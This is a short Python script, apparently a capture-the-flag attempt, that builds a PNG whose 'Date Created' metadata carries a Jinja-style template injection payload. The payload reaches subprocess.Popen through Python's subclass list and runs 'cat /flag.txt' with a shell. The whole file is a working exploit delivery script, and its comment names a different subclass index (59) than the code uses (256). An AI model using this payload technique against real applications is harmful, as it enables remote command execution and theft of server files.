from PIL import Image, PngImagePlugin

img = Image.new("RGB", (1, 1), (255, 255, 255))
pi = PngImagePlugin.PngInfo()
# A longer fallback expression that tries to read via several likely subclass indices.
payload = "{{ (''.__class__.__mro__[1].__subclasses__()[256]('cat /flag.txt', shell=True, stdout=-1).stdout.read()) }}"
# Note: index 59 is a common Popen index in some versions; if it errors it may be suppressed or return nothing.
pi.add_text("Date Created", "2025:10:28 02:17:17 " + payload)
img.save("flag_try3.png", "PNG", pnginfo=pi)
print("flag_try3.png created")
